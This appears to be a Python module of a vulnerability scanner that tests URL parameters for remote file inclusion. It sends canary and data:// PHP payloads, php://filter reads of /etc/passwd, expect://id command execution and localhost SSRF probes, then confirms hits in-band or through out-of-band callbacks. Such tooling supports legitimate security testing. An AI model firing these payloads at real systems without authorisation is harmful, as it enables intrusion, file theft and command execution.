"""rfi v2 — Remote File Inclusion with OOB + in-band detection."""
import secrets
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.verify import confidence, is_signal


def _make_canary():
    tok = secrets.token_hex(4)
    host = "omni-rfi-" + tok + ".oob.local"
    marker = "OMNI_RFI_" + tok
    return host, marker


def _make_payloads(host, marker):
    """Возвращает list of (name, payload)."""
    import base64
    php_inline = "<?php echo '" + marker + "'; ?>"
    b64 = base64.b64encode(php_inline.encode()).decode()
    return [
        # --- external HTTP(S) ---
        ("http_direct",     "http://" + host + "/shell.txt"),
        ("https_direct",    "https://" + host + "/shell.txt"),
        ("protocol_rel",    "//" + host + "/shell.txt"),
        ("http_marker",     "http://" + host + "/" + marker + ".txt"),
        # --- data:// wrapper (no external server needed) ---
        ("data_b64",        "data://text/plain;base64," + b64),
        ("data_plain",      "data://text/plain,<?php echo '" + marker + "'; ?>"),
        ("data_text",       "data:text/plain," + marker),
        # --- php:// wrappers ---
        ("php_filter",      "php://filter/convert.base64-encode/resource=/etc/passwd"),
        ("php_input",       "php://input"),
        # --- expect:// (RCE) ---
        ("expect_id",       "expect://id"),
        # --- ftp / gopher (SSRF-стиль) ---
        ("ftp",             "ftp://" + host + "/x"),
        ("gopher",          "gopher://" + host + "/_test"),
        # --- localhost probe (для metadata/internal) ---
        ("localhost_80",    "http://127.0.0.1:80/"),
        ("localhost_8080",  "http://127.0.0.1:8080/"),
    ]


# localhost/internal markers (для in-band detection)
LOCAL_MARKERS = [
    "root:x:0:0:root:",
    "daemon:x:1:1:",
    "uid=", "gid=",
    "SSH-2.0-",
    "Server: nginx", "Server: Apache",
    "<title>Index of /",
    "Jenkins", "Kubernetes",
]


def _check_oob(marker, before):
    try:
        from core.oob_server import OOBHandler
        hits = getattr(OOBHandler, "hits", [])
        return [h for h in hits[before:] if marker in (h.get("path") or "")]
    except Exception:
        return []


def _oob_count():
    try:
        from core.oob_server import OOBHandler
        return len(getattr(OOBHandler, "hits", []))
    except Exception:
        return -1


class Rfi:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}

        host, marker = _make_canary()
        payloads = _make_payloads(host, marker)
        oob_available = _oob_count() >= 0

        print("[rfi v2] target: " + target)
        print("[rfi v2] canary: " + host)
        print("[rfi v2] marker: " + marker)
        print("[rfi v2] " + str(len(payloads)) + " payloads, params=" + str(list(params.keys())))

        # baseline — что уже в исходной странице
        try:
            base_r = http.get(target)
            baseline_text = (base_r.text or "") if base_r else ""
        except Exception:
            baseline_text = ""

        active_local_markers = [m for m in LOCAL_MARKERS
                                if m.lower() not in baseline_text.lower()]

        hits_before = _oob_count()
        findings = []
        sent = 0

        for name in params:
            print()
            print("[rfi v2] param: " + name)
            for pname, payload in payloads:
                q = dict(params)
                q[name] = [payload]
                test_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                try:
                    r = http.get(test_url, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue
                sent += 1
                body = r.text or ""

                # --- 1. in-band: canary или marker в теле ---
                if marker in body and marker not in baseline_text:
                    try:
                        r2 = http.get(test_url, allow_redirects=False)
                    except Exception:
                        r2 = None
                    if r2 and marker in (r2.text or ""):
                        conf = confidence(0.9, 1.0)
                        if is_signal(conf, floor=0.55, module="rfi"):
                            findings.append({
                                "type": "rfi_inband_canary",
                                "severity": "critical",
                                "param": name,
                                "payload_name": pname,
                                "payload": payload[:120],
                                "confidence": conf,
                            })
                            print("  RFI in-band (canary): " + pname)
                            logger.finding("rfi", "critical", name + " " + pname)
                            break

                # --- 2. in-band: local markers (etc/passwd, uid, server banner) ---
                for m in active_local_markers:
                    if m.lower() in body.lower():
                        # verify ×2
                        try:
                            r2 = http.get(test_url, allow_redirects=False)
                        except Exception:
                            r2 = None
                        if not r2 or m.lower() not in (r2.text or "").lower():
                            continue
                        conf = confidence(0.85, 1.0)
                        if not is_signal(conf, floor=0.55, module="rfi"):
                            continue
                        findings.append({
                            "type": "rfi_inband_local",
                            "severity": "critical",
                            "param": name,
                            "payload_name": pname,
                            "payload": payload[:120],
                            "marker": m,
                            "confidence": conf,
                        })
                        print("  RFI in-band (local): " + pname + " marker=" + m[:30])
                        logger.finding("rfi", "critical", name + " " + pname + " " + m[:30])
                        break
                else:
                    continue
                break

        # --- OOB check ---
        print()
        print("[rfi v2] " + str(sent) + " probes sent, waiting 3s for OOB...")
        import time
        time.sleep(3.0)

        oob_hits = _check_oob(marker, hits_before)
        if oob_hits and not findings:
            conf = confidence(0.98, 1.0)
            if is_signal(conf, floor=0.55, module="rfi"):
                findings.append({
                    "type": "rfi_oob_confirmed",
                    "severity": "critical",
                    "hits": oob_hits[:5],
                    "confidence": conf,
                })
                print("  RFI OOB confirmed: " + str(len(oob_hits)) + " callbacks")
                logger.finding("rfi", "critical", "OOB " + str(len(oob_hits)))
        elif not oob_available:
            print("  OOB server not running — in-band only")

        print()
        print("[rfi v2] findings: " + str(len(findings)))
        return {
            "findings": findings,
            "canary": host,
            "probes_sent": sent,
        }
